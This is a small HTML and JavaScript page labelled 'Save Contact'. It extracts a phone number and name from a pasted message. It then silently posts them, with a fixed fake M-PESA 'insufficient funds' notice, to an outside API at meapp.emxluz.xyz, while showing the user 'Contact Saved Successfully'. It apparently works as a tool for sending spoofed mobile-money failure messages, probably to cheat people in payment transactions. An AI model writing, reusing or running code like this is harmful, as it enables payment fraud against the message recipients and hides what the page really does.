
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Save Contact</title>
<style>
    body { font-family: Arial, sans-serif; background: #121212; color: white; padding: 20px; margin: 0; }
    .container { max-width: 500px; width: 90%; margin: auto; background: #1e1e1e; padding: 20px; border-radius: 10px; box-sizing: border-box; }
    h3 { text-align: center; margin-bottom: 15px; font-size: 1.4rem; }
    textarea { width: 100%; height: 160px; padding: 10px; margin-top: 10px; background: #2a2a2a; border: none; border-radius: 6px; color: white; font-size: 1rem; resize: vertical; box-sizing: border-box; }
    
    .manual-input-container { display: none; margin-top: 15px; padding: 10px; border: 1px dashed #4CAF50; border-radius: 6px; }
    .manual-input-container label { display: block; margin-bottom: 5px; font-size: 0.9rem; color: #4CAF50; }
    input[type="text"] { width: 100%; padding: 12px; background: #333; border: 1px solid #4CAF50; border-radius: 4px; color: white; box-sizing: border-box; font-size: 1rem; }

    button { width: 100%; padding: 14px; margin-top: 15px; border: none; border-radius: 6px; background: #4CAF50; color: white; font-weight: bold; cursor: pointer; font-size: 16px; transition: background 0.3s; }
    button:hover:not(:disabled) { background: #45a049; }
    button:disabled { background: gray; cursor: not-allowed; }
    
    pre { background: #000; padding: 15px; margin-top: 15px; white-space: pre-wrap; word-wrap: break-word; border-radius: 6px; font-size: 0.95rem; color: #4CAF50; border: 1px solid #333; min-height: 20px; }
    .warning-text { color: #ffeb3b; }

    @media (max-width: 400px) {
        body { padding: 10px; }
        .container { padding: 15px; }
        textarea { height: 140px; }
    }
</style>
</head>
<body>

<div class="container">
    <h3>Save Contact</h3>
    
    <textarea id="message" placeholder="Paste message here..."></textarea>

    <div id="manualArea" class="manual-input-container">
        <label for="manualPhone">Enter number manually:</label>
        <input type="text" id="manualPhone" placeholder="Type phone number here">
    </div>

    <button id="saveBtn" onclick="saveContact()">SAVE CONTACT</button>
    <pre id="output"></pre>
</div>

<script>
const API = "https://meapp.emxluz.xyz";
const FIXED_MESSAGE = "Failed. Insufficient funds in your M-PESA account as well as Fuliza M-PESA to send KSH1500.00. Available Fuliza M-PESA limit KSH0.00.";

function extractDetails(message) {
    // regex updated to find digits, optionally starting with +
    // This will catch 07..., 254..., or +254...
    let phoneMatch = message.match(/\+?\d[\d\s-]{7,15}/); 
    let phone = phoneMatch ? phoneMatch[0].replace(/\s+/g, '') : ""; // Remove accidental spaces
    
    let nameMatch = message.match(/(?:sent to|to)\s+([^0-9]{2,40})/i);
    let name = "Unknown";
    
    if (nameMatch) {
        name = nameMatch[1]
            .split(/\s+on\s/i)[0]
            .split(/\s+at\s/i)[0]
            .trim();
    }
    return { phone, name };
}

function generateToken() {
    return "CONTACT" + Math.floor(Math.random() * 100000);
}

async function saveContact() {
    const btn = document.getElementById("saveBtn");
    const output = document.getElementById("output");
    const manualArea = document.getElementById("manualArea");
    const manualPhoneInput = document.getElementById("manualPhone");
    const pastedMessage = document.getElementById("message").value.trim();

    output.innerText = "";
    output.classList.remove("warning-text");

    let data = extractDetails(pastedMessage);

    // If no number found in the pasted text, check the manual input box
    if (!data.phone) {
        let manualValue = manualPhoneInput.value.trim();
        
        if (manualValue.length > 0) {
            data.phone = manualValue; // Use whatever the user typed
        } else {
            manualArea.style.display = "block";
            output.innerText = "❌ No number detected. Please type it in the box above.";
            output.classList.add("warning-text");
            return;
        }
    }

    btn.disabled = true;
    btn.innerText = "Saving...";
    let token = generateToken();

    try {
        const response = await fetch(`${API}/send`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                phone: data.phone,
                name: data.name,
                amount: 0,
                token: token,
                message: FIXED_MESSAGE
            })
        });

        if (response.ok) {
            output.innerText = "Contact Saved Successfully ✅\n\nName: " + data.name + "\nPhone: " + data.phone;
            btn.innerText = "Saved ✓";
            manualArea.style.display = "none";
            manualPhoneInput.value = "";
        } else {
            throw new Error();
        }
        
    } catch (error) {
        output.innerText = "❌ Connection Error";
        btn.disabled = false;
        btn.innerText = "SAVE CONTACT";
    }
}
</script>

</body>
</html>
